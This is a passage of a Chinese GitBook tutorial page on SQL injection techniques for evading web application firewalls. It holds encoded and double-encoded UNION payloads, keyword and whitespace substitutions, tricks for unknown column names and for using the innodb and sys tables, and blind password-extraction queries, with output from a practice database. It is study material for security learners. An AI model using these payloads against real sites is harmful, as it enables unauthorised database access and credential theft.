@@ -1,0 +1,601 @@
+
+<!DOCTYPE HTML>
+<html lang="zh-hans" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>sql注入的技巧 · WEB安全知识总结</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="EASY">
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-anchors/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-toggle-chapters/toggle.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="Sqlmap使用教程.html" />
+    
+    
+    <link rel="prev" href="sql注入基础.html" />
+    
+
+    
+    
+    
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="输入并搜索" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://www.easy233.top/" target="_blank" class="custom-link">Home</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">web安全基础</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../sql注入漏洞.html">
+            
+                <a href="../sql注入漏洞.html">
+            
+                    
+                    Sql注入
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="sql注入基础.html">
+            
+                <a href="sql注入基础.html">
+            
+                    
+                    sql注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.1.2" data-path="sql注入的技巧.html">
+            
+                <a href="sql注入的技巧.html">
+            
+                    
+                    sql注入的技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="Sqlmap使用教程.html">
+            
+                <a href="Sqlmap使用教程.html">
+            
+                    
+                    sqlmap使用教程
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >sql注入的技巧</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#&#x524D;&#x8A00;"><b>1.1. </b>&#x524D;&#x8A00;</a></li><li><span class="title-icon "></span><a href="#sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x6280;&#x672F;"><b>1.2. </b>Sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x6280;&#x672F;</a></li><li><span class="title-icon "></span><a href="#&#x7F16;&#x7801;&#x7ED5;&#x8FC7;"><b>1.3. </b>&#x7F16;&#x7801;&#x7ED5;&#x8FC7;</a></li><li><span class="title-icon "></span><a href="#&#x5185;&#x8054;&#x6CE8;&#x91CA;"><b>1.4. </b>&#x5185;&#x8054;&#x6CE8;&#x91CA;</a></li><li><span class="title-icon "></span><a href="#&#x5173;&#x952E;&#x5B57;&#x7ED5;&#x8FC7;"><b>1.5. </b>&#x5173;&#x952E;&#x5B57;&#x7ED5;&#x8FC7;</a></li><ul><li><span class="title-icon "></span><a href="#and&#x548C;or"><b>1.5.1. </b>and&#x548C;or</a></li><li><span class="title-icon "></span><a href="#&#x7A7A;&#x683C;"><b>1.5.2. </b>&#x7A7A;&#x683C;</a></li></ul><li><span class="title-icon "></span><a href="#&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;"><b>1.6. </b>&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;</a></li><ul><li><span class="title-icon "></span><a href="#like"><b>1.6.1. </b>lIKE</a></li><li><span class="title-icon "></span><a href="#in"><b>1.6.2. </b>IN</a></li><li><span class="title-icon "></span><a href="#between"><b>1.6.3. </b>Between</a></li></ul><li><span class="title-icon "></span><a href="#&#x4F7F;&#x7528;mid&#x7B49;&#x9017;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;"><b>1.7. </b>&#x4F7F;&#x7528;mid()&#x7B49;&#x9017;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;</a></li><li><span class="title-icon "></span><a href="#&#x7ED5;&#x8FC7;&#x672A;&#x77E5;&#x5B57;&#x6BB5;&#x540D;&#x7684;&#x6280;&#x5DE7;"><b>1.8. </b>&#x7ED5;&#x8FC7;&#x672A;&#x77E5;&#x5B57;&#x6BB5;&#x540D;&#x7684;&#x6280;&#x5DE7;</a></li><li><span class="title-icon "></span><a href="#innodb"><b>1.9. </b>innodb</a></li><li><span class="title-icon "></span><a href="#sys"><b>1.10. </b>sys</a></li><li><span class="title-icon "></span><a href="#&#x7B49;&#x4EF7;&#x51FD;&#x6570;"><b>1.11. </b>&#x7B49;&#x4EF7;&#x51FD;&#x6570;</a></li><li><span class="title-icon "></span><a href="#php&#x4E2D;&#x5E38;&#x89C1;&#x7684;waf&#x53CA;&#x7ED5;&#x8FC7;"><b>1.12. </b>php&#x4E2D;&#x5E38;&#x89C1;&#x7684;waf&#x53CA;&#x7ED5;&#x8FC7;</a></li><li><span class="title-icon "></span><a href="#&#x5206;&#x6BB5;&#x4F20;&#x8F93;&#x8FC7;waf"><b>1.13. </b>&#x5206;&#x6BB5;&#x4F20;&#x8F93;&#x8FC7;WAF</a></li><li><span class="title-icon "></span><a href="#&#x586B;&#x5145;&#x5783;&#x573E;&#x6570;&#x636E;&#x8FC7;waf"><b>1.14. </b>&#x586B;&#x5145;&#x5783;&#x573E;&#x6570;&#x636E;&#x8FC7;WAF</a></li><li><span class="title-icon "></span><a href="#&#x63A8;&#x8350;&#x9605;&#x8BFB;&#x6587;&#x7AE0;"><b>1.15. </b>&#x63A8;&#x8350;&#x9605;&#x8BFB;&#x6587;&#x7AE0;</a></li></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h2 id="&#x524D;&#x8A00;"><a name="&#x524D;&#x8A00;" class="anchor-navigation-ex-anchor" href="#&#x524D;&#x8A00;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x524D;&#x8A00;</h2>
+<p>&#x7B2C;&#x4E00;&#x7BC7;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x4E66;&#x5199;&#x6700;&#x7B80;&#x5355;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;waf&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x7406;&#x60F3;&#x60C5;&#x51B5;&#xFF0C;&#x4F46;&#x662F;&#x73B0;&#x5B9E;&#x5374;&#x5F80;&#x5F80;&#x5145;&#x6EE1;&#x9669;&#x963B;&#x3002;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x987A;&#x5229;&#x5229;&#x7528;Sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x5B66;&#x4E60;Sql&#x6CE8;&#x5165;&#x7684;&#x4E00;&#x4E9B;&#x7ED5;&#x8FC7;waf&#x6280;&#x5DE7;&#x3002;</p>
+<h2 id="sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x6280;&#x672F;"><a name="sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x6280;&#x672F;" class="anchor-navigation-ex-anchor" href="#sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x6280;&#x672F;"><i class="fa fa-link" aria-hidden="true"></i></a>1.2. Sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x6280;&#x672F;</h2>
+<p>&#x4E00;&#x822C;&#x5C31;&#x662F;&#x4EE5;&#x4E0B;&#x8FD9;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;:</p>
+<ul>
+<li>&#x5927;&#x5C0F;&#x5199;&#x7ED5;&#x8FC7;</li>
+<li>&#x53CC;&#x5199;&#x7ED5;&#x8FC7;</li>
+<li>&#x7F16;&#x7801;&#x7ED5;&#x8FC7;(url&#x7F16;&#x7801;&#xFF0C;16&#x8FDB;&#x5236;)</li>
+<li>&#x5185;&#x8054;&#x6CE8;&#x91CA;&#x7ED5;&#x8FC7;</li>
+<li>&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;</li>
+<li>&#x7B49;&#x4EF7;&#x51FD;&#x6570;&#x7ED5;&#x8FC7;</li>
+<li>&#x53C2;&#x6570;&#x6C61;&#x67D3;</li>
+</ul>
+<p>&#x5927;&#x5C0F;&#x5199;&#x7ED5;&#x8FC7;&#xFF0C;&#x53CC;&#x5199;&#x7ED5;&#x8FC7;&#x8FD9;&#x4E24;&#x4E2A;&#x5F88;&#x7B80;&#x5355;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x591A;&#x82B1;&#x7B14;&#x58A8;&#x4E66;&#x5199;&#x4E86;&#x3002;</p>
+<h2 id="&#x7F16;&#x7801;&#x7ED5;&#x8FC7;"><a name="&#x7F16;&#x7801;&#x7ED5;&#x8FC7;" class="anchor-navigation-ex-anchor" href="#&#x7F16;&#x7801;&#x7ED5;&#x8FC7;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x7F16;&#x7801;&#x7ED5;&#x8FC7;</h2>
+<p>&#x4F7F;&#x7528;URLEncode&#x7F16;&#x7801;&#xFF0C;ASCII,HEX,unicode&#x7F16;&#x7801;&#x7ED5;&#x8FC7;</p>
+<pre><code>or 1=1&#x5373;%6f%72%20%31%3d%31&#xFF0C;&#x800C;Test&#x4E5F;&#x53EF;&#x4EE5;&#x4E3A;CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)&#x3002;
+
+&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;
+
+SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
+
+&#x53CC;&#x91CD;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;
+
+?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+
+
+&#x4E00;&#x4E9B;unicode&#x7F16;&#x7801;&#x4E3E;&#x4F8B;&#xFF1A;    
+&#x5355;&#x5F15;&#x53F7;&#xFF1A;&apos;
+%u0027 %u02b9 %u02bc
+%u02c8 %u2032
+%uff07 %c0%27
+%c0%a7 %e0%80%a7
+&#x7A7A;&#x767D;&#xFF1A;
+%u0020 %uff00
+%c0%20 %c0%a0 %e0%80%a0
+&#x5DE6;&#x62EC;&#x53F7;(:
+%u0028 %uff08
+%c0%28 %c0%a8
+%e0%80%a8
+&#x53F3;&#x62EC;&#x53F7;):
+%u0029 %uff09
+%c0%29 %c0%a9
+%e0%80%a9
+</code></pre><h2 id="&#x5185;&#x8054;&#x6CE8;&#x91CA;"><a name="&#x5185;&#x8054;&#x6CE8;&#x91CA;" class="anchor-navigation-ex-anchor" href="#&#x5185;&#x8054;&#x6CE8;&#x91CA;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x5185;&#x8054;&#x6CE8;&#x91CA;</h2>
+<p>&#x8FD9;&#x4E2A;&#x5728;&#x7B2C;&#x4E00;&#x7AE0;Sql&#x6CE8;&#x5165;&#x57FA;&#x7840;&#x4E2D;&#x5DF2;&#x7ECF;&#x8BB2;&#x89E3;&#x8FC7;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x5185;&#x8054;&#x6CE8;&#x91CA;&#x7ED5;&#x8FC7;&#x7684;&#x5B9E;&#x4F8B;:</p>
+<p><a href="https://xz.aliyun.com/t/7430" target="_blank">&#x67D0;&#x72D7;SQL&#x6CE8;&#x5165;WAF&#x7ED5;&#x8FC7;</a></p>
+<h2 id="&#x5173;&#x952E;&#x5B57;&#x7ED5;&#x8FC7;"><a name="&#x5173;&#x952E;&#x5B57;&#x7ED5;&#x8FC7;" class="anchor-navigation-ex-anchor" href="#&#x5173;&#x952E;&#x5B57;&#x7ED5;&#x8FC7;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. &#x5173;&#x952E;&#x5B57;&#x7ED5;&#x8FC7;</h2>
+<h3 id="and&#x548C;or"><a name="and&#x548C;or" class="anchor-navigation-ex-anchor" href="#and&#x548C;or"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.1. and&#x548C;or</h3>
+<pre><code>&amp;&amp; &#x4EE3;&#x66FF;and
+|| &#x4EE3;&#x66FF; or
+</code></pre><h3 id="&#x7A7A;&#x683C;"><a name="&#x7A7A;&#x683C;" class="anchor-navigation-ex-anchor" href="#&#x7A7A;&#x683C;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5.2. &#x7A7A;&#x683C;</h3>
+<pre><code>%20 %09 %0a %0b %0c %0d %a0 /**/
+</code></pre><p>&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x4F7F;&#x7528;()&#x6765;&#x7ED5;&#x8FC7;&#x7A7A;&#x683C;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6BD4;&#x8F83;&#x9E21;&#x808B;&#x5E76;&#x4E0D;&#x662F;&#x901A;&#x7528;&#x7684;&#xFF0C;&#x5728;MySQL&#x4E2D;&#xFF0C;&#x62EC;&#x53F7;&#x662F;&#x7528;&#x6765;&#x5305;&#x56F4;&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4EFB;&#x4F55;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x51FA;&#x7ED3;&#x679C;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x7528;&#x62EC;&#x53F7;&#x5305;&#x56F4;&#x8D77;&#x6765;&#x3002;</p>
+<p>&#x4F8B;&#x5982;&#x4E0B;&#x9762;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6267;&#x884C;</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">users</span>)<span class="hljs-keyword">where</span>(user_id)=<span class="hljs-number">1</span>;
+</code></pre>
+<p><img src="http://picbed.easy233.top//imgimage-20201017201616142.png" alt="image-20201017201616142"></p>
+<p>&#x800C;&#x4F7F;&#x7528;&#x8BE5;&#x8BED;&#x53E5;
+<code>select * from(users)where(user_id)=(0)union(select)(1),2,3,4,6,7,8,3;</code></p>
+<p>&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#x56E0;&#x4E3A;select&#x5E76;&#x4E0D;&#x662F;&#x5B50;&#x67E5;&#x8BE2;</p>
+<p><img src="http://picbed.easy233.top//imgimage-20201017201923238.png" alt="image-20201017201923238"></p>
+<h2 id="&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;"><a name="&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;" class="anchor-navigation-ex-anchor" href="#&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;"><i class="fa fa-link" aria-hidden="true"></i></a>1.6. &#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;</h2>
+<h3 id="like"><a name="like" class="anchor-navigation-ex-anchor" href="#like"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.1. lIKE</h3>
+<pre><code>1&apos; and 1 like 0 --+
+&#x53EF;&#x4EE5;&#x4EE3;&#x66FF;=&#x7ED5;&#x8FC7;
+</code></pre><h3 id="in"><a name="in" class="anchor-navigation-ex-anchor" href="#in"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.2. IN</h3>
+<p>&#x5728;&#x8FC7;&#x6EE4;&#x7B49;&#x53F7;&#x6216;&#x8005;&#x8FC7;&#x6EE4;like&#x7B49;&#x7684;sql&#x6CE8;&#x5165;&#x60C5;&#x51B5;&#x4E0B;IN&#x5F88;&#x6709;&#x7528;</p>
+<p><img src="http://picbed.easy233.top//imgimage-20201018143356053.png" alt="image-20201018143356053"></p>
+<h3 id="between"><a name="between" class="anchor-navigation-ex-anchor" href="#between"><i class="fa fa-link" aria-hidden="true"></i></a>1.6.3. Between</h3>
+<p>BETWEEN&#x64CD;&#x4F5C;&#x7B26;&#x5728;WHERE&#x5B50;&#x53E5;&#x4E2D;&#x4F7F;&#x7528;&#xFF0C;&#x4F5C;&#x7528;&#x662F;&#x9009;&#x53D6;&#x4ECB;&#x4E8E;&#x4E24;&#x4E2A;&#x503C;&#x4E4B;&#x95F4;&#x7684;&#x6570;&#x636E;&#x8303;&#x56F4;&#x3002;&#x4E5F;&#x5C31;&#x8BF4;&#x8BA9;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD0;&#x7528;&#x4E00;&#x4E2A;&#x8303;&#x56F4;(range)&#x5185;&#x6293;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x503C;&#x3002;</p>
+<p>&#x627E;&#x51FA;user&#x5B57;&#x6BB5;&#x4E2D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x7B26;&#x5408;&#x5728;a&#x548C;b&#x5B57;&#x7B26;&#x4E2D;&#x95F4;&#x7684;&#x5B57;&#x7B26;&#x7684;&#x5B57;&#x6BB5;&#x3002;</p>
+<pre><code>select * from users where substr(user,1,1) between &apos;a&apos; and &apos;b&apos;;
+</code></pre><p><img src="http://picbed.easy233.top//imgimage-20201018144256514.png" alt="image-20201018144256514"></p>
+<h3 id=""><a name="" class="plugin-anchor" href="#"><i class="fa fa-link" aria-hidden="true"></i></a>&lt;&gt;</h3>
+<p>&lt;&gt;&#x5728;mysql&#x7684;&#x7B97;&#x672F;&#x8FD0;&#x7B97;&#x7B26;&#x4E2D;&#x610F;&#x4E3A;&#x4E0D;&#x76F8;&#x7B49;&#x7684;&#x610F;&#x601D;&#x548C;!=&#x4E00;&#x6837;&#x3002;</p>
+<pre><code>select substr(&apos;abc&apos;,1,1)&lt;&gt;&apos;a&apos;;   &#x8FD4;&#x56DE;0
+select substr(&apos;abc&apos;,1,1)&lt;&gt;&apos;b&apos;;   &#x8FD4;&#x56DE;1
+</code></pre><h2 id="&#x4F7F;&#x7528;mid&#x7B49;&#x9017;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;"><a name="&#x4F7F;&#x7528;mid&#x7B49;&#x9017;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;" class="anchor-navigation-ex-anchor" href="#&#x4F7F;&#x7528;mid&#x7B49;&#x9017;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;"><i class="fa fa-link" aria-hidden="true"></i></a>1.7. &#x4F7F;&#x7528;mid()&#x7B49;&#x9017;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;</h2>
+<pre><code>mid(user() from 1 for 1)
+substr(user() from 1 for 1)
+</code></pre><h2 id="&#x7ED5;&#x8FC7;&#x672A;&#x77E5;&#x5B57;&#x6BB5;&#x540D;&#x7684;&#x6280;&#x5DE7;"><a name="&#x7ED5;&#x8FC7;&#x672A;&#x77E5;&#x5B57;&#x6BB5;&#x540D;&#x7684;&#x6280;&#x5DE7;" class="anchor-navigation-ex-anchor" href="#&#x7ED5;&#x8FC7;&#x672A;&#x77E5;&#x5B57;&#x6BB5;&#x540D;&#x7684;&#x6280;&#x5DE7;"><i class="fa fa-link" aria-hidden="true"></i></a>1.8. &#x7ED5;&#x8FC7;&#x672A;&#x77E5;&#x5B57;&#x6BB5;&#x540D;&#x7684;&#x6280;&#x5DE7;</h2>
+<p>waf&#x62E6;&#x622A;&#x4E86;information_schema&#x3001;columns&#x3001;tables&#x3001;database&#x3001;schema&#x7B49;&#x5173;&#x952E;&#x5B57;&#x6216;&#x51FD;&#x6570;</p>
+<pre><code>mysql&gt; select * from users;
++----+----------+------------+
+| id | username | password   |
++----+----------+------------+
+|  1 | Dumb     | Dumb       |
+|  2 | Angelina | I-kill-you |
+|  3 | Dummy    | p@ssword   |
+|  4 | secure   | crappy     |
+|  5 | stupid   | stupidity  |
+|  6 | superman | genious    |
+|  7 | batman   | mob!le     |
+|  8 | admin    | admin      |
+|  9 | admin1   | admin1     |
+| 10 | admin2   | admin2     |
+| 11 | admin3   | admin3     |
+| 12 | dhakkan  | dumbo      |
+| 14 | admin4   | admin4     |
+| 15 | security | security   |
++----+----------+------------+
+14 rows in set (0.00 sec)
+
+mysql&gt; select `2` from (select 1,2,3 union select * from users)a limit 1,1;
++------+
+| 2    |
++------+
+| Dumb |
++------+
+1 row in set (0.00 sec)
+
+mysql&gt; select `1`,`2`,`3` from (select 1,2,3 union select * from users)a limit 1,1;
++---+------+------+
+| 1 | 2    | 3    |
++---+------+------+
+| 1 | Dumb | Dumb |
++---+------+------+
+1 row in set (0.00 sec)
+</code></pre><h2 id="innodb"><a name="innodb" class="anchor-navigation-ex-anchor" href="#innodb"><i class="fa fa-link" aria-hidden="true"></i></a>1.9. innodb</h2>
+<p><strong><code>MySQL 5.7</code>&#x4E4B;&#x540E;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5728;&#x5176;&#x81EA;&#x5E26;&#x7684; mysql &#x5E93;&#x4E2D;&#xFF0C;&#x65B0;&#x589E;&#x4E86;<code>innodb_table_stats</code> &#x548C;<code>innodb_index_stats</code>&#x8FD9;&#x4E24;&#x5F20;&#x65E5;&#x5FD7;&#x8868;&#x3002;&#x5982;&#x679C;&#x6570;&#x636E;&#x8868;&#x7684;&#x5F15;&#x64CE;&#x662F;<code>innodb</code> &#xFF0C;&#x5219;&#x4F1A;&#x5728;&#x8FD9;&#x4E24;&#x5F20;&#x8868;&#x4E2D;&#x8BB0;&#x5F55;&#x8868;&#x3001;&#x952E;&#x7684;&#x4FE1;&#x606F; &#x3002;</strong>
+&#x5982;&#x679C;waf&#x6389;&#x4E86;information&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E24;&#x4E2A;&#x8868;&#x6CE8;&#x5165;&#x6570;&#x636E;&#x5E93;&#x540D;&#x548C;&#x8868;&#x540D;&#x3002;</p>
+<pre><code>mysql&gt; select * from mysql.innodb_table_stats;
++---------------+----------------------------+---------------------+--------+----------------------+--------------------------+
+| database_name | table_name                 | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
++---------------+----------------------------+---------------------+--------+----------------------+--------------------------+
+| challenges    | lve59e0gpb                 | 2020-09-07 19:57:13 |      0 |                    1 |                        0 |
+| django_study  | auth_group                 | 2020-07-27 12:54:26 |      0 |                    1 |                        1 |
+| django_study  | auth_group_permissions     | 2020-07-27 12:54:20 |      0 |                    1 |         
+
+mysql&gt; select * from mysql.innodb_index_stats;
++---------------+----------------------------+----------------------------------------------------------------+---------------------+--------------+------------+-------------+-----------------------------------+
+| database_name | table_name                 | index_name                                                     | last_update         | stat_name    | stat_value | sample_size | stat_description                  |
++---------------+----------------------------+----------------------------------------------------------------+---------------------+--------------+------------+-------------+-----------------------------------+
+| challenges    | lve59e0gpb                 | PRIMARY                                                        | 2020-09-07 19:57:13 | n_diff_pfx01 |          0 |           1 | sessid
+                    |
+| challenges    | lve59e0gpb                 | PRIMARY                                                        | 2020-09-07 19:57:13 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |
+</code></pre><h2 id="sys"><a name="sys" class="anchor-navigation-ex-anchor" href="#sys"><i class="fa fa-link" aria-hidden="true"></i></a>1.10. sys</h2>
+<p>MySQL 5.7&#x7248;&#x4E2D;&#xFF0C;&#x65B0;&#x52A0;&#x5165;&#x4E86;<code>sys</code> schema&#xFF0C;&#x91CC;&#x9762;&#x6574;&#x5408;&#x4E86;&#x5404;&#x79CD;&#x8D44;&#x6599;&#x5E93;&#x8D44;&#x8BAF;
+&#x5176;&#x4E2D;&#x5BF9;&#x6211;&#x4EEC;&#x6700;&#x6709;&#x7528;&#x7684;&#x8D44;&#x8BAF;&#x5927;&#x6982;&#x5C31;&#x662F;<code>statement_analysis</code>&#x8868;&#x4E2D;&#x7684;<code>query</code>&#xFF0C;&#x91CC;&#x9762;&#x7EAA;&#x5F55;&#x7740;&#x6211;&#x4EEC;&#x6267;&#x884C;&#x8FC7;&#x7684;SQL&#x8BED;&#x53E5;&#xFF08;normalize&#x8FC7;&#x7684;&#xFF09;&#x548C;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x3002;</p>
+<pre><code class="lang-mysql">select query from sys.statement_analysis;
+</code></pre>
+<p><img src="http://picbed.easy233.top//imgimage-20201018153854459.png" alt="image-20201018153854459"></p>
+<h2 id="&#x7B49;&#x4EF7;&#x51FD;&#x6570;"><a name="&#x7B49;&#x4EF7;&#x51FD;&#x6570;" class="anchor-navigation-ex-anchor" href="#&#x7B49;&#x4EF7;&#x51FD;&#x6570;"><i class="fa fa-link" aria-hidden="true"></i></a>1.11. &#x7B49;&#x4EF7;&#x51FD;&#x6570;</h2>
+<p>&#x5F15;&#x81EA;&#x6587;&#x7AE0;[Sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;</p>
+<pre><code>hex()&#x3001;bin() ==&gt; ascii()
+
+sleep() ==&gt;benchmark()
+
+concat_ws()==&gt;group_concat()
+
+mid()&#x3001;substr() ==&gt; substring()
+
+@@user ==&gt; user()
+
+@@datadir ==&gt; datadir()
+
+&#x4E3E;&#x4F8B;&#xFF1A;substring()&#x548C;substr()&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x65F6;&#xFF1A;?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74&#x3000;
+
+&#x6216;&#x8005;&#xFF1A;
+substr((select &apos;password&apos;),1,1) = 0x70
+strcmp(left(&apos;password&apos;,1), 0x69) = 1
+strcmp(left(&apos;password&apos;,1), 0x70) = 0
+strcmp(left(&apos;password&apos;,1), 0x71) = -1
+</code></pre><h2 id="php&#x4E2D;&#x5E38;&#x89C1;&#x7684;waf&#x53CA;&#x7ED5;&#x8FC7;"><a name="php&#x4E2D;&#x5E38;&#x89C1;&#x7684;waf&#x53CA;&#x7ED5;&#x8FC7;" class="anchor-navigation-ex-anchor" href="#php&#x4E2D;&#x5E38;&#x89C1;&#x7684;waf&#x53CA;&#x7ED5;&#x8FC7;"><i class="fa fa-link" aria-hidden="true"></i></a>1.12. php&#x4E2D;&#x5E38;&#x89C1;&#x7684;waf&#x53CA;&#x7ED5;&#x8FC7;</h2>
+<p>&#x5F15;&#x81EA;&#x6587;&#x7AE0;<a href="https://www.windylh.com/2018/06/10/Sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" target="_blank">Sql&#x6CE8;&#x5165;&#x7ED5;&#x8FC7;&#x59FF;&#x52BF;</a></p>
+<h4 id="&#x8FC7;&#x6EE4;and-or"><a name="&#x8FC7;&#x6EE4;and-or" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;and-or"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;and-or" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;and-or"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;and or</h4>
